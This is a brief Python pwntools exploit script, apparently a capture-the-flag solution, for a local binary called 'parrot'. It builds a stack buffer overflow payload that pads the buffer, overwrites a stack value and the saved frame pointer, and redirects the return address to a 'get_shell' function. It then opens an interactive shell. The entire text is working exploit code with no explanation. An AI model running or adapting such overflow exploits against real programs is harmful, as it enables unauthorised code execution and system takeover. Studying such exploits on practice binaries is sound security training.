from pwn import *

elf = ELF("./parrot")

p = elf.process()

# gdb.attach(p, '''start''')

offset = 32 + 8

rpb = 32

payload = [
    b'A' * (rpb - 8),
    p64(0x53900000000),
    b'A' * 8,
    p64(elf.symbols['get_shell']),

]

payload = b"".join(payload)

p.send(payload)

p.interactive()